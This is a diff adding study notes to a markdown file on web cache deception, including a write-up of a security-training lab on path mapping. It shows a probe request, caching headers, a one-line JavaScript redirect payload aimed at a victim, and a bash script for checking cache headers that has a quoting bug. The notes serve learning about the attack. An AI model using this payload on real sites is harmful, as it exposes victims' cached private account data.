@@ -37,3 +37,23 @@ To test how the cache maps the URL path to resources, you'll need to modify the 
 Caches may have rules based on specific static extensions. Try a range of extensions, including .css, .ico, and .exe.
 
 You can then craft a URL that returns a dynamic response that is stored in the cache. Note that this attack is limited to the specific endpoint that you tested, as the origin server often has different abstraction rules for different endpoints. 
+
+
+# Lab: Exploiting path mapping for web cache deception
+1. curl 'https://0ada00640380e01585758164009100b5.web-security-academy.net/my-account/abc.css'
+2. Caching Headers
+   cache-control: max-age=30
+   age: 0
+   x-cache: miss
+3. Exploit : Craft a Javascript payload and sent it to victim.
+4. <script>document.location="http://vulnerable.tld/path/foo..css"</script>
+
+# Automation
+<pre>
+    #!/bin/bash
+    url=$1
+    check=$(curl -s -i -k '$url/foo.js')
+    echo $check | grep "x-cache:"
+    echo $check | grep "cache-control:"
+    echo $check | grep "Sensitive"
+</pre>
